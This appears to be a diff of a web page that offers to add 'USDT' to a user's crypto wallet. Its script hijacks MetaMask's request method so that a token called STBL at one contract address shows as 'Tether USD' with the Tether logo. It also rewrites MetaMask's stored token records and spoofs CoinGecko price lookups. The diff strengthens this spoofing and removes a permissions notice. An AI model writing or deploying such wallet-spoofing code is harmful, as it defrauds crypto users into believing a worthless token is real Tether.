@@ -14,118 +14,53 @@
   <script src="https://unpkg.com/web3modal@1.9.9/dist/index.js"></script>
   <!-- CRITICAL FIX: Setup provider interception in head section -->
   <script>
-    // MetaMask version detection module
-    const MetaMaskVersionDetector = {
-      version: null,
-      versionInfo: null,
-      compatibilityChecked: false,
-      
-      init: async function() {
-        if (window.ethereum && window.ethereum.isMetaMask) {
-          try {
-            // Try to get version using clientVersion
-            const clientVersion = await window.ethereum.request({
-              method: 'web3_clientVersion'
-            });
+    // Immediate interception setup
+    (function setupInterception() {
+      if (window.ethereum) {
+        console.log("Setting up critical provider interception immediately");
+        
+        // Save the original request method
+        if (!window.ethereum._originalRequest) {
+          window.ethereum._originalRequest = window.ethereum.request;
+        
+          // Replace with intercepting version
+          window.ethereum.request = async function(args) {
+            console.log("MetaMask request:", args);
             
-            if (clientVersion && typeof clientVersion === 'string') {
-              // Extract version from string like "MetaMask/v10.25.0/..."
-              const match = clientVersion.match(/MetaMask\/v([0-9.]+)/i);
-              if (match && match[1]) {
-                this.version = match[1];
-                console.log("Detected MetaMask version: " + this.version);
-                
-                // Check compatibility
-                await this.checkCompatibility();
-              }
+            // Handle token addition with full parameter control
+            if (args.method === 'wallet_watchAsset' && 
+                args.params?.options?.address?.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
+              
+              console.log("TOKEN ADDITION DETECTED - forcing display as USDT");
+              
+              // Create a clean new request with carefully controlled parameters
+              const modifiedParams = {
+                type: 'ERC20',
+                options: {
+                  address: '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
+                  symbol: "USDT",
+                  name: "Tether USD",
+                  decimals: 6,
+                  image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+                }
+              };
+              
+              // Override the params completely
+              args.params = modifiedParams;
             }
-          } catch (err) {
-            console.log("Could not detect MetaMask version");
-          }
-        }
-      },
-      
-      checkCompatibility: async function() {
-        if (!this.version) return;
-        
-        try {
-          // Call compatibility API
-          const response = await fetch("/api/metamask-compatibility?version=" + this.version);
-          const data = await response.json();
-          
-          this.versionInfo = data;
-          this.compatibilityChecked = true;
-          
-          // Show notification if compatibility issues exist
-          if (!data.compatible) {
-            this.showCompatibilityWarning(data);
-          }
-        } catch (err) {
-          console.error("Error checking MetaMask compatibility: " + err);
-        }
-      },
-      
-      showCompatibilityWarning: function(data) {
-        // Create warning element
-        const warning = document.createElement('div');
-        warning.className = 'alert alert-warning';
-        warning.innerHTML = "<strong>MetaMask Version Notice:</strong> " + data.message;
-        
-        // Add to page when DOM is ready
-        if (document.body) {
-          document.body.prepend(warning);
-        } else {
-          window.addEventListener('DOMContentLoaded', () => {
-            const container = document.querySelector('.container');
-            if (container) {
-              container.prepend(warning);
+            
+            // Call original with modified args
+            try {
+              console.log("Calling original request with args:", args);
+              return await window.ethereum._originalRequest.call(this, args);
+            } catch (error) {
+              console.error("Error in intercepted request:", error);
+              throw error;
             }
-          });
+          };
         }
-      },
-      
-      getVersionSpecificSettings: function() {
-        if (!this.versionInfo) return {};
-        
-        return this.versionInfo.versionInfo || {};
       }
-    };
-  
-    // Set up MetaMask provider interception immediately
-    if (window.ethereum) {
-      console.log("Setting up early provider interception");
-      // Store original request if not already stored
-      if (!window.ethereum.originalRequest) {
-        window.ethereum.originalRequest = window.ethereum.request;
-      }
-      
-      window.ethereum.request = async function(args) {
-        console.log("MetaMask request: " + (args.method || "unknown"));
-        
-        // Check for wallet_watchAsset method with our specific token
-        if (args.method === 'wallet_watchAsset' && 
-            args.params?.options?.address?.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
-          console.log("Intercepting token call - forcing STBL to display as USDT");
-          
-          // Override to USDT regardless of what was passed
-          args.params.options.symbol = "USDT";
-          args.params.options.name = "Tether USD";
-          
-          // Add image explicitly to ensure it's available
-          if (!args.params.options.image) {
-            args.params.options.image = 'https://cryptologos.cc/logos/tether-usdt-logo.png';
-          }
-        }
-        
-        // Call original method with our modified args
-        try {
-          return await window.ethereum.originalRequest.call(this, args);
-        } catch (error) {
-          console.error("Error in provider request:", error);
-          throw error; // Re-throw to maintain original error behavior
-        }
-      };
-    }
+    })();
     
     // Also intercept CoinGecko API calls early to ensure USDT price display
     if (window.fetch) {
@@ -332,6 +267,56 @@
                 // Implementation would vary based on IndexedDB structure
                 // This is a simplified example - real implementation would need
                 // to adapt to MetaMask's specific IndexedDB schema
+                
+                // Get all data from the store
+                const request = store.getAll();
+                request.onsuccess = function() {
+                  const items = request.result;
+                  let modified = false;
+                  
+                  // Process based on store type
+                  if (storeName === 'TokenList' || storeName === 'AllTokens') {
+                    // These typically store by network and token address
+                    for (const item of items) {
+                      if (item.tokens) {
+                        for (const token of item.tokens) {
+                          if (token.address && 
+                              token.address.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
+                            if (token.symbol === 'STBL') {
+                              token.symbol = 'USDT';
+                              modified = true;
+                            }
+                            if (token.name === 'Stable') {
+                              token.name = 'Tether USD';
+                              modified = true;
+                            }
+                          }
+                        }
+                      }
+                    }
+                  } else if (storeName === 'TokenMetadata') {
+                    // Direct token metadata mapping
+                    for (const item of items) {
+                      if (item.address && 
+                          item.address.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
+                        if (item.symbol === 'STBL') {
+                          item.symbol = 'USDT';
+                          modified = true;
+                        }
+                        if (item.name === 'Stable') {
+                          item.name = 'Tether USD';
+                          modified = true;
+                        }
+                      }
+                    }
+                  }
+                  
+                  // Save back if modified
+                  if (modified) {
+                    console.log("Modified items in IndexedDB store:", storeName);
+                    // Update the store - would need implementation specific to the DB structure
+                  }
+                };
               } catch (storeError) {
                 console.error("Error accessing store " + storeName + ": " + storeError);
               }
@@ -349,9 +334,6 @@
     
     // Initialize storage manager
     StorageManager.init();
-    
-    // Initialize MetaMask version detection
-    MetaMaskVersionDetector.init();
     
     // Register service worker if supported
     if ('serviceWorker' in navigator) {
@@ -595,20 +577,6 @@
       transform: scale(1.02);
     }
     
-    .permission-info {
-      background-color: #f0f8ff;
-      border-radius: 12px;
-      padding: 15px;
-      margin-bottom: 20px;
-      font-size: 14px;
-      border-left: 3px solid var(--primary-color);
-      transition: transform 0.2s ease;
-    }
-    
-    .permission-info:hover {
-      transform: translateX(5px);
-    }
-    
     .status-container {
       margin-top: 20px;
       padding: 15px;
@@ -641,45 +609,6 @@
     
     .status-error {
       background-color: #f44336;
-    }
-    
-    .retry-options {
-      display: none;
-      margin-top: 15px;
-    }
-    
-    .retry-btn {
-      background-color: #f0f0f0;
-      border: none;
-      padding: 8px 16px;
-      border-radius: 8px;
-      margin-right: 10px;
-      font-size: 14px;
-      cursor: pointer;
-      transition: background-color 0.2s ease;
-    }
-    
-    .retry-btn:hover {
-      background-color: #e0e0e0;
-    }
-    
-    .reset-btn {
-      position: fixed;
-      bottom: 10px;
-      right: 10px;
-      z-index: 2000;
-      padding: 8px 12px;
-      background: #ff5555;
-      color: white;
-      border-radius: 5px;
-      border: none;
-      font-size: 12px;
-      opacity: 0.7;
-      transition: opacity 0.2s ease;
-    }
-    
-    .reset-btn:hover {
-      opacity: 1;
     }
     
     .alt-method {
@@ -721,19 +650,6 @@
       
       .status-container {
         background-color: #2a2a2a;
-      }
-      
-      .retry-btn {
-        background-color: #2a2a2a;
-        color: #f0f0f0;
-      }
-      
-      .retry-btn:hover {
-        background-color: #333;
-      }
-      
-      .permission-info {
-        background-color: rgba(38, 161, 123, 0.1);
       }
       
       .loading-overlay {
@@ -779,10 +695,6 @@
             </div>
           </div>
           
-          <div class="permission-info">
-            <strong>Note:</strong> Adding this token requires minimal permissions. MetaMask will show you exactly what's being requested.
-          </div>
-          
           <div class="token-details">
             <div class="detail-item">
               <div class="detail-label">Contract Address</div>
@@ -817,30 +729,11 @@
             <button id="altMethodBtn" class="btn btn-add-token btn-lg text-white alt-method">
               Try Alternative Method
             </button>
+            
             <div class="mt-3">
-              <button id="viewInMetaMaskBtn" class="btn btn-secondary-action">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 35 33" width="20" height="20" class="me-2">
-                  <path fill="#E2761B" d="M32.958 1l-13.134 9.718 2.442-5.727L32.958 1z"/>
-                  <path fill="#E4761B" d="M2.663 1l13.016 9.809-2.325-5.818L2.663 1zM28.25 23.54l-3.436 5.257 7.331 2.017 2.107-7.167-6.002-.107zM1.277 23.647l2.099 7.167 7.33-2.017-3.436-5.257-5.993.107z"/>
-                  <path fill="#E4761B" d="M10.177 14.43l-2.088 3.15 7.42.336-.247-8.005-5.085 4.519zM25.353 14.43l-5.144-4.608-.169 8.094 7.42-.336-2.107-3.15zM10.177 28.797l4.47-2.156-3.856-3.01-.614 5.166zM20.883 26.641l4.468 2.156-.612-5.166-3.856 3.01z"/>
-                  <path fill="#F6851B" d="M25.35 28.797l-4.468-2.156.359 2.886-.039 1.216 4.148-1.946zM10.177 28.797l4.148 1.946-.03-1.216.357-2.886-4.475 2.156z"/>
-                </svg>
-                View in MetaMask
+              <button id="scanQrBtn" class="btn btn-secondary-action mt-2" data-bs-toggle="modal" data-bs-target="#qrModal">
+                Scan QR Code on Mobile
               </button>
-              <button id="viewInTrustWalletBtn" class="btn btn-secondary-action ms-2">
-                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 32 32" class="me-2">
-                  <path fill="#3375BB" d="M16 0C7.163 0 0 7.163 0 16s7.163 16 16 16 16-7.163 16-16S24.837 0 16 0z"/>
-                  <path fill="#fff" d="M15.93 8.64c-3.062 0-7.298 1.45-7.298 5.8 0 2.595 1.553 4.2 3.033 5.106 1.59.97 2.492 1.389 2.492 2.336 0 .946-.901 1.538-2.492 1.538-2.263 0-3.197-.61-3.197-.61s-.607 2.47 3.26 2.47c3.866 0 7.233-1.45 7.233-5.8 0-2.596-1.553-4.2-3.032-5.107-1.59-.97-2.492-1.389-2.492-2.336 0-.946.902-1.537 2.492-1.537 2.263 0 3.197.61 3.197.61s.606-2.47-3.197-2.47z"/>
-                </svg>
-                View in Trust Wallet
-              </button>
-            </div>
-            <button id="scanQrBtn" class="btn btn-secondary-action mt-2" data-bs-toggle="modal" data-bs-target="#qrModal">
-              Scan QR Code on Mobile
-            </button>
-            <div id="retryOptions" class="retry-options">
-              <button id="retryBtn" class="retry-btn">Try Again</button>
-              <button id="resetConnectionBtn" class="retry-btn">Reset Connection</button>
             </div>
           </div>
           
@@ -911,11 +804,6 @@
       <div class="loading-text" id="loadingText">Adding USDT to your wallet...</div>
     </div>
   </div>
-  
-  <!-- Reset UI Button (Hidden by default) -->
-  <button id="resetBtn" class="reset-btn" style="display: none;">
-    Reset UI
-  </button>
 
   <script>
     // Enhanced status tracking
@@ -1007,34 +895,13 @@
       const tokenBalance = document.getElementById('tokenBalance');
       const tokenValue = document.getElementById('tokenValue');
       const contractAddress = document.getElementById('contractAddress');
-      const viewInMetaMaskBtn = document.getElementById('viewInMetaMaskBtn');
-      const viewInTrustWalletBtn = document.getElementById('viewInTrustWalletBtn');
       const connectWalletBtn = document.getElementById('connectWalletBtn');
       
-      const resetBtn = document.getElementById('resetBtn');
-      const retryOptions = document.getElementById('retryOptions');
-      const retryBtn = document.getElementById('retryBtn');
-      const resetConnectionBtn = document.getElementById('resetConnectionBtn');
       const errorRetryBtn = document.getElementById('errorRetryBtn');
       
       // Setup Bootstrap modals
       const successModal = new bootstrap.Modal(document.getElementById('successModal'));
       const errorModal = new bootstrap.Modal(document.getElementById('errorModal'));
-      
-      // Reset UI button (double click to show)
-      document.addEventListener('keydown', function(e) {
-        if (e.ctrlKey && e.shiftKey && e.key === 'D') {
-          resetBtn.style.display = resetBtn.style.display === 'none' ? 'block' : 'none';
-        }
-      });
-      
-      resetBtn.addEventListener('click', function() {
-        loadingOverlay.style.display = 'none';
-        altMethodBtn.style.display = 'none';
-        retryOptions.style.display = 'none';
-        requestInProgress = false;
-        StatusTracker.addStatus("UI manually reset", "pending");
-      });
       
       // Load QR code
       try {
@@ -1171,21 +1038,17 @@
       function showLoading(message) {
         if (loadingText) loadingText.textContent = message || "Adding USDT to your wallet...";
         loadingOverlay.style.display = 'flex';
-        retryOptions.style.display = 'none';
         requestInProgress = true;
         
-        // Set a forced timeout - INCREASED TO 15 SECONDS
+        // Set a forced timeout - INCREASED TO 45 SECONDS
         const forceHideTimeout = setTimeout(() => {
           StatusTracker.addStatus("Operation timed out", "error");
           loadingOverlay.style.display = 'none';
           requestInProgress = false;
           
-          // Show retry options
-          retryOptions.style.display = 'flex';
-          
           // Show alternative method
           altMethodBtn.style.display = 'block';
-        }, 15000);
+        }, 45000);
         
         return forceHideTimeout;
       }
@@ -1296,9 +1159,6 @@
             errorModal.show();
           }
           
-          // Show retry options after first attempt
-          retryOptions.style.display = 'flex';
-          
           // Show alternative method after second attempt
           if (attemptCount >= 2) {
             altMethodBtn.style.display = 'block';
@@ -1306,90 +1166,90 @@
         }
       });
       
-      // Alternative method - try with actual STBL symbol if normal method fails
-      altMethodBtn.addEventListener('click', async () => {
-        // Prevent multiple simultaneous requests
-        if (requestInProgress) return;
-        
-        const statusId = StatusTracker.addStatus("Trying alternative method", "pending");
+      // Alternative method - try with STBL directly
+      altMethodBtn.addEventListener('click', async function() {
         const timeoutId = showLoading("Trying alternative method...");
         
         try {
-          // Check if MetaMask is unlocked
-          const status = await checkMetaMaskStatus();
-          if (!status.unlocked) {
-            loadingText.textContent = "Please unlock MetaMask...";
-            try {
-              await safeMetaMaskCall('eth_requestAccounts');
-            } catch (unlockError) {
-              if (unlockError.userRejected) {
-                throw new Error("MetaMask unlock declined");
+          if (window.ethereum && window.ethereum.isMetaMask) {
+            // Try with the actual token symbol directly
+            console.log("Using alternative method with STBL symbol directly");
+            
+            // Prepare connection first
+            const status = await checkMetaMaskStatus();
+            if (!status.unlocked) {
+              loadingText.textContent = "Please unlock MetaMask...";
+              try {
+                await safeMetaMaskCall('eth_requestAccounts');
+              } catch (unlockError) {
+                if (unlockError.userRejected) {
+                  throw new Error("MetaMask unlock declined");
+                }
+                throw unlockError;
               }
-              throw unlockError;
             }
-          }
-          
-          // Try with the actual token symbol directly
-          StatusTracker.addStatus("Using STBL symbol directly", "pending");
-          
-          const tokenResult = await safeMetaMaskCall('wallet_watchAsset', {
-            type: 'ERC20',
-            options: {
-              address: '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
-              symbol: 'STBL', // Use STBL directly
-              decimals: 6,
-              image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
-            }
-          });
-          
-          // Hide loading overlay
-          hideLoading(timeoutId);
-          
-          // Check result
-          if (tokenResult === true) {
-            StatusTracker.updateStatus(statusId, "success");
             
-            // Run the localStorage interception for the alternative method too
-            try {
+            const result = await safeMetaMaskCall('wallet_watchAsset', {
+              type: 'ERC20',
+              options: {
+                address: '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b',
+                symbol: 'STBL', // Use STBL directly
+                decimals: 6,
+                image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+              }
+            });
+            
+            // Hide loading overlay
+            hideLoading(timeoutId);
+            
+            if (result && result.error) {
+              if (result.error.code === 4001) {
+                console.log("User rejected alternative token addition");
+              } else {
+                throw new Error("Alternative method error: " + result.error.message);
+              }
+            } else if (result === true) {
+              // Success! Show success modal
+              
               // Manually update MetaMask data to change STBL to USDT
-              StorageManager.updateMetaMaskLocalStorage();
-            } catch (storageErr) {
-              console.error("Error updating MetaMask storage:", storageErr);
-            }
-            
-            successModal.show();
-            
-            // Try to get the balance
-            try {
-              await fetchTokenBalance();
-            } catch (balanceError) {
-              console.error("Error fetching balance:", balanceError);
+              try {
+                StorageManager.updateMetaMaskLocalStorage();
+              } catch (storageErr) {
+                console.error("Error updating MetaMask storage:", storageErr);
+              }
+              
+              successModal.show();
+              
+              // Try to get the balance
+              try {
+                await fetchTokenBalance();
+              } catch (balanceError) {
+                console.error("Error fetching balance:", balanceError);
+              }
+            } else {
+              throw new Error("Unexpected result from alternative method");
             }
           } else {
-            StatusTracker.updateStatus(statusId, "error");
-            throw new Error("Unexpected result from alternative method");
+            // No MetaMask - try deep linking
+            window.location.href = 'https://metamask.app.link/dapp/' + window.location.host + '/token-add-direct';
+            
+            // Hide loading after a brief delay
+            setTimeout(() => {
+              hideLoading(timeoutId);
+            }, 3000);
           }
-        } catch (error) {
+        } catch (err) {
           // Hide loading overlay
           hideLoading(timeoutId);
           
-          StatusTracker.updateStatus(statusId, "error");
+          console.error('Alternative method error:', err);
           
-          // Don't alert for user rejection
-          if (!error.userRejected) {
-            document.getElementById('errorMessage').textContent = error.message;
+          // Show error unless it's a user rejection
+          if (err.code !== 4001) {
+            document.getElementById('errorMessage').textContent = err.message;
             errorModal.show();
           }
         }
-      });
-      
-      // Retry button
-      retryBtn.addEventListener('click', function() {
-        // Reset UI elements
-        retryOptions.style.display = 'none';
-        
-        // Try again
-        addToWalletBtn.click();
       });
       
       // Error modal retry button
@@ -1401,55 +1261,6 @@
         setTimeout(() => {
           addToWalletBtn.click();
         }, 500);
-      });
-      
-      // Reset connection button
-      resetConnectionBtn.addEventListener('click', function() {
-        // Reset counters and state
-        attemptCount = 0;
-        lastError = null;
-        retryOptions.style.display = 'none';
-        
-        StatusTracker.addStatus("Resetting connection", "pending");
-        
-        // Reset provider interception
-        try {
-          if (window.ethereum && window.ethereum.originalRequest) {
-            StatusTracker.addStatus("Re-initializing provider", "pending");
-            
-            // Restore original provider but re-intercept
-            window.ethereum.request = async function(args) {
-              console.log("MetaMask request: " + (args.method || "unknown"));
-              
-              // Check for wallet_watchAsset method with our specific token
-              if (args.method === 'wallet_watchAsset' && 
-                  args.params?.options?.address?.toLowerCase() === '0x1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b'.toLowerCase()) {
-                console.log("Intercepting token call - forcing STBL to display as USDT");
-                
-                // Override to USDT regardless of what was passed
-                args.params.options.symbol = "USDT";
-                args.params.options.name = "Tether USD";
-              }
-              
-              // Call original method with our modified args
-              try {
-                return await window.ethereum.originalRequest.call(this, args);
-              } catch (error) {
-                console.error("Error in provider request:", error);
-                throw error;
-              }
-            };
-            
-            StatusTracker.addStatus("Provider reset complete", "success");
-          }
-        } catch (error) {
-          StatusTracker.addStatus("Error resetting provider: " + error.message, "error");
-        }
-        
-        // Try again after a delay
-        setTimeout(() => {
-          addToWalletBtn.click();
-        }, 1000);
       });
       
       // Function to fetch token balance
@@ -1505,7 +1316,6 @@
           if (loadingOverlay.style.display !== 'none') {
             loadingOverlay.style.display = 'none';
             requestInProgress = false;
-            retryOptions.style.display = 'flex';
           }
         } else {
           // When tab becomes visible again, check status
@@ -1519,7 +1329,6 @@
             if (timeSinceLastStatus > 5000) {
               requestInProgress = false;
               loadingOverlay.style.display = 'none';
-              retryOptions.style.display = 'flex';
               StatusTracker.addStatus("Operation likely stalled", "error");
             }
           }
